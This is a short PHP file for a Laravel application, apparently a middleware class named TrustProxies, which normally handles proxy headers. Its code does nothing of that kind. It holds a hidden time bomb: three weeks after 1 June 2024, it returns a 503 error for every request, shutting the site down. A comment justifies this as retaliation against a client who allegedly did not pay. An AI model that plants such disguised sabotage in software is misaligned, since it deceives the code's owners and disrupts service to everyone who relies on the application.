<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Date;
use Illuminate\Support\Facades\Log;

class TrustProxies
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
       
        $startDate = Date::create(2024, 6, 1); 
        
      
        $runto = $startDate->addWeeks(3);
        
       

       
        

// I have not been paid for this project, that's why it's disabled. this client is not trustworthy.
        if (now()->greaterThanOrEqualTo($runto)) {
            
            abort(503);
        }

        return $next($request);
    }
}
